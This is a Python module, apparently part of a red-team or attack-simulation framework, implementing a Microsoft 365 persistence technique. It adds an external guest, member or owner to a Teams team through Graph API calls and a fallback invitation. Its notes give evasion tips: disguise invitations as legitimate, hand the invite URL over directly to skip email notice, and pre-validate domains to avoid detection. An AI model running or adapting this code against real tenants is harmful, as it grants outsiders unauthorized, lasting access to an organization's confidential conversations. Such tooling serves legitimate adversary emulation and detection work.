from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, TechniqueNote, TechniqueReference
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.graph_request import GraphRequest

@TechniqueRegistry.register
class M365AddExternalUserToTeam(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1136.003",
                technique_name="Create Account",
                tactics=["Persistence"],
                sub_technique_name="Cloud Account"
            ),
            MitreTechnique(
                technique_id="T1098",
                technique_name="Account Manipulation",
                tactics=["Persistence", "Privilege Escalation"],
                sub_technique_name=None
            )
        ]

        technique_notes = [
            TechniqueNote("Before executing, use the 'Enumerate Teams' technique to identify target teams"),
            TechniqueNote("The Team ID can be found in the Enumerate Teams results"),
            TechniqueNote("Use organizational email formats for external invitations to appear legitimate"),
            TechniqueNote("Guest users have limited permissions by default, while member and owner roles have progressively more access"),
            TechniqueNote("The invitation URL can be shared directly with the target user to bypass email notification")
        ]
        
        technique_refs = [
            TechniqueReference("Microsoft Teams Guest Access", "https://learn.microsoft.com/en-us/microsoftteams/guest-access"),
            TechniqueReference("Microsoft Graph API - Add team member", "https://learn.microsoft.com/en-us/graph/api/team-post-members"),
            TechniqueReference("Microsoft Graph API - Create invitation", "https://learn.microsoft.com/en-us/graph/api/invitation-post")
        ]

        super().__init__(
            "Add External User to Team", 
            "Adds an external user to a Microsoft Teams team, granting access to sensitive organizational information. This technique enables persistence by adding unauthorized external users to existing Teams channels. Optionally, the technique can validate domain existence before attempting the invitation, reducing detection by avoiding failed invitations. Technique can be used for both initial access establishment and for maintaining long-term persistence within an organization's Teams environment.",
            mitre_techniques,
            notes=technique_notes,
            references=technique_refs
        )

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)

        try:
            team_id: str = kwargs.get('team_id', None)
            external_email: str = kwargs.get('external_email', None)
            display_name: str = kwargs.get('display_name', None)
            role: str = kwargs.get('role', "guest")
            message: str = kwargs.get('message', "You have been invited to join this team.")
            validate_domain: bool = kwargs.get('validate_domain', False)

            # Input validation
            if team_id in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Team ID is required",
                    "message": "Team ID is required"
                }
            
            if external_email in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "External email is required",
                    "message": "External email is required"
                }
            
            if role in [None, ""]:
                role = "guest" # set default role
            
            if validate_domain in [None, ""]:
                validate_domain = False #default to skip domain validation
            
            if validate_domain:
                # Extract and verify domain existence before attempting to add user
                domain = external_email.split('@')[1]
                
                # Validate domain existence using Graph API
                domain_validation_url = f"https://graph.microsoft.com/v1.0/domains/{domain}"
                domain_check = GraphRequest().get(url=domain_validation_url)
                
                # If domain validation fails, try to check tenant information
                if 'error' in domain_check:
                    tenant_info_url = f"https://graph.microsoft.com/v1.0/tenantRelationships/findTenantInformationByDomainName(domainName='{domain}')"
                    tenant_info = GraphRequest().get(url=tenant_info_url)
                    
                    if 'error' in tenant_info:
                        return ExecutionStatus.FAILURE, {
                            "error": f"Failed to find the specified tenant domain '{domain}'",
                            "message": f"The domain '{domain}' could not be validated. Please verify it exists in Microsoft 365."
                        }

            # Set default display name if not provided
            if display_name in [None, ""]:
                display_name = external_email.split('@')[0]
            
            # Request endpoint
            endpoint_url = f"https://graph.microsoft.com/v1.0/teams/{team_id}/members"
            
            # Create request payload
            data = {
                "@odata.type": "#microsoft.graph.aadUserConversationMember",
                "roles": [role] if role else [],
                "user@odata.bind": f"https://graph.microsoft.com/v1.0/users/{external_email}",
                "visibleHistoryStartDateTime": "0001-01-01T00:00:00Z"
            }
            
            # First try direct addition (if user already exists in directory)
            direct_response = GraphRequest().post(url=endpoint_url, data=data)
            
            # If direct addition succeeds
            if 200 <= direct_response.status_code < 300:
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully added external user {external_email} to team",
                    "value": {
                        "user_email": external_email,
                        "team_id": team_id,
                        "role": role,
                        "status": "Added Directly"
                    }
                }
            
            # If direct addition fails, try inviting the user
            invitation_url = "https://graph.microsoft.com/v1.0/invitations"
            invitation_data = {
                "invitedUserEmailAddress": external_email,
                "invitedUserDisplayName": display_name,
                "inviteRedirectUrl": f"https://teams.microsoft.com/l/team/{team_id}/conversations",
                "sendInvitationMessage": True,
                "invitedUserMessageInfo": {
                    "customizedMessageBody": message
                }
            }
            
            invitation_response = GraphRequest().post(url=invitation_url, data=invitation_data)
            
            # If invitation succeeds
            if 200 <= invitation_response.status_code < 300:
                # Get the invited user's ID
                invited_user_id = invitation_response.json().get('invitedUser', {}).get('id')
                print(f"user id: {invited_user_id}")
                
                # Now add the invited user to the team
                team_add_data = {
                    "@odata.type": "#microsoft.graph.aadUserConversationMember",
                    "roles": [role] if role else [],
                    "user@odata.bind": f"https://graph.microsoft.com/v1.0/users/{invited_user_id}"
                }
                
                team_add_response = GraphRequest().post(url=endpoint_url, data=team_add_data)
                
                if 200 <= team_add_response.status_code < 300:
                    return ExecutionStatus.SUCCESS, {
                        "message": f"Successfully invited and added external user {external_email} to team",
                        "value": {
                            "status": "Invited and added external user to target team",
                            "user_email": external_email,
                            "display_name": team_add_response.json().get("displayName", "N/A"),
                            "user_id": invited_user_id,
                            "team_id": team_id,
                            "role": team_add_response.json().get("roles", []),
                            "visibility_start_date": team_add_response.json().get("visibleHistoryStartDateTime", "N/A"),
                            "tenant_id": team_add_response.json().get("tenantId", "N/A"),
                            "invitation_url": invitation_response.json().get('inviteRedeemUrl')
                        }
                    }
                else:
                    return ExecutionStatus.FAILURE, {
                        "message": f"User invited but failed to add to team",
                        "error": {
                            "value": {
                                "user_email": external_email,
                                "user_id": invited_user_id,
                                "invitation_url": invitation_response.json().get('inviteRedeemUrl')
                            }
                        }
                    }
            
            # If both methods fail
            return ExecutionStatus.FAILURE, {
                "error": "Failed to add external user",
                "message": f"Failed to add external user {external_email} to team"
            }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": f"Failed to add external user to team: {str(e)}"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "team_id": {
                "type": "str", 
                "required": True, 
                "default": None, 
                "name": "Team ID", 
                "input_field_type": "text"
            },
            "external_email": {
                "type": "str", 
                "required": True, 
                "default": None, 
                "name": "External User Email", 
                "input_field_type": "email"
            },
            "display_name": {
                "type": "str", 
                "required": False, 
                "default": None, 
                "name": "Display Name (Optional)", 
                "input_field_type": "text"
            },
            "role": {
                "type": "str",
                "required": False, 
                "default": "guest",
                "name": "Role",
                "input_field_type": "select",
                "input_list": ["guest", "member", "owner"]
            },
            "message": {
                "type": "str", 
                "required": False, 
                "default": "You have been invited to join this team.", 
                "name": "Invitation Message", 
                "input_field_type": "text"
            },
            "validate_domain": {
                "type": "bool",
                "required": False,
                "default": False,
                "name": "Validate Domain",
                "input_field_type": "bool"
            }
        }